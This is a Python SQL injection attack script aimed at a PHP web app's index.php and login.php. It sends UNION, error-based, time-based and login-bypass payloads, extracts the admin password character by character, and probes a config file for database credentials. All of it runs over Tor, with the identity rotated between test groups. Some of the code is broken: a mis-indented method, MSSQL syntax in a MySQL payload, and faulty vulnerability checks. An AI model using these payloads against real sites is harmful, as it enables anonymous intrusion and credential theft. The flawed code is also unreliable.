import time
import argparse
from urllib.parse import urljoin
import socks
import socket
import requests
from stem.control import Controller

class SQLiTester:
    def __init__(self, base_url, proxy=None):
        self.base_url = base_url.rstrip('/')
        self.proxy = proxy
        self.session = requests.Session()
        
        if proxy:
            proxy_host, proxy_port = proxy.split(':')
            socks.set_default_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
            socket.socket = socks.socksocket
            print(f"🔵 Using SOCKS proxy: {proxy}")
            self._print_current_ip()

    def _print_current_ip(self):
        try:
            ip = self.session.get("http://httpbin.org/ip", timeout=10).json()["origin"]
            print(f"🌐 Current IP: {ip}")
        except Exception as e:
            print(f"⚠️ Could not get IP: {e}")

    def _request_new_tor_identity(self):
        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()  # Use password='yourpassword' if set in torrc
                controller.signal('NEWNYM')
                print("🔁 New Tor identity requested.")
            time.sleep(5)
            self._print_current_ip()
        except Exception as e:
            print(f"⚠️ Failed to request new identity: {e}")

    def _send_request(self, url, data=None, method='POST'):
        try:
            if method == 'POST':
                r = self.session.post(url, data=data, timeout=10)
            else:
                r = self.session.get(url, timeout=10)
            return r
        except Exception as e:
            print(f"⚠️ Request failed: {str(e)}")
            return None

    def test_increase_count(self):
        print("\n🔴 [TEST] IncreaseCount() SQLi")
        url = urljoin(self.base_url, "/index.php")
        tests = [
            ("Column injection", {"e0": "100", "type": "error`=9999,`loads`=0 -- "}),
            ("Time-based", {"e0": "1000000' OR (SELECT SLEEP(3)) -- "}),
            ("Boolean-based", {"e0": "100' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables)) -- "})
        ]
        for name, payload in tests:
            start = time.time()
            r = self._send_request(url, data=payload)
            duration = time.time() - start
            if not r:
                continue
            status = "🚨 VULNERABLE" if r.status_code == 200 and duration < 3 else "✅ Protected"
            if "Time" in name and duration >= 3:
                status = "🚨 VULNERABLE (Blind)"
            print(f"{name:20} {status} (HTTP {r.status_code}, {duration:.2f}s)")

    def test_get_task_content(self):
        print("\n🔴 [TEST] GetTaskContent() SQLi")
        url = urljoin(self.base_url, "/index.php")
        tests = [
            ("Basic UNION", {"id": "test' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- ", "vs": "1", "lv": "0"}),
            ("Error-based", {"id": "test' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- ", "vs": "1", "lv": "0"}),
            ("Boolean-based", {"id": "test' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' -- ", "vs": "1", "lv": "0"})
        ]
        for name, payload in tests:
            r = self._send_request(url, data=payload)
            if not r:
                continue
            vulnerable = any(keyword in r.text for keyword in ["error in your SQL", "UNION", "@@version"])
            print(f"{name:20} {'🚨 VULNERABLE' if vulnerable else '✅ Protected'}")

    def test_login_bypass(self):
        print("\n🔴 [TEST] Login Bypass")
        url = urljoin(self.base_url, "/login.php")
        payloads = [
            ("Basic bypass", {"login": "admin' -- ", "password": "anything"}),
            ("Password comment", {"login": "admin", "password": "wrong' OR '1'='1"}),
            ("Always true", {"login": "' OR 1=1 -- ", "password": ""})
        ]
        for name, payload in payloads:
            r = self._send_request(url, data=payload)
            if not r:
                continue
            redirect = r.history[0].headers.get('Location', '') if r.history else ''
            if "statistic.php" in redirect or "statistic.php" in r.url:
                print(f"{name:20} 🚨 VULNERABLE (Redirect to {r.url})")
            else:
                print(f"{name:20} ✅ Protected")

      def test_config_poisoning(self):
        print("\n🔴 [TEST] Config Poisoning")
        login_url = urljoin(self.base_url, "/login.php")
        self._send_request(login_url, data={"login": "admin", "password": "admin"})

        url = urljoin(self.base_url, "/config/config.inc.php")
        r = self._send_request(url, method="GET")
        if not r:
            return
        if "mysql_connect" in r.text or "root" in r.text:
            print("🚨 VULNERABLE - Config data exposed!")
        else:
            print("✅ Protected - Config not exposed")

def run_all_tests(tester):
    tester.test_increase_count()
    tester._request_new_tor_identity()

    tester.test_get_task_content()
    tester._request_new_tor_identity()

    tester.test_login_bypass()
    tester._request_new_tor_identity()

    tester.test_config_poisoning()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="🧪 SQLi Test Harness over Tor")
    parser.add_argument("--url", required=True, help="Base URL of the web app")
    parser.add_argument("--proxy", default="127.0.0.1:9050", help="SOCKS5 proxy (default: 127.0.0.1:9050)")
    args = parser.parse_args()

    tester = SQLiTester(args.url, proxy=args.proxy)
    run_all_tests(tester)

